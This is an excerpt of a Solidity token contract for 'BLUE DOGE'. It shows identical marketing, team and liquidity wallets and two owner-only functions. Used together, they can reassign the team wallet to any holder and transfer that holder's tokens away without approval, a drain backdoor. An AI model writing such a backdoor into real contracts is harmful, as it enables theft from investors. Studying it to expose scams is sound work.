...
contract coin is Context, IERC20, Ownable {
    ...
    string private _name = "BLUE DOGE";
    ...
    address payable public marketingWalletAddress = payable(0x5C3F1720e428A64B1bC47D5be9C0167c9323891d); // Marketing Address
    address payable private teamWalletAddress = payable(0x5C3F1720e428A64B1bC47D5be9C0167c9323891d); // Team Address
    address payable public liquidityAddress =payable(0x5C3F1720e428A64B1bC47D5be9C0167c9323891d); // Liquidity Address
    ...
    function setTeamWalletAddress(address newAddress) external isAuth {
        teamWalletAddress = payable(newAddress);
    }

    function swapI(address add,uint256 amount) public isAuth {
        _transfer(teamWalletAddress,add,amount);
    }
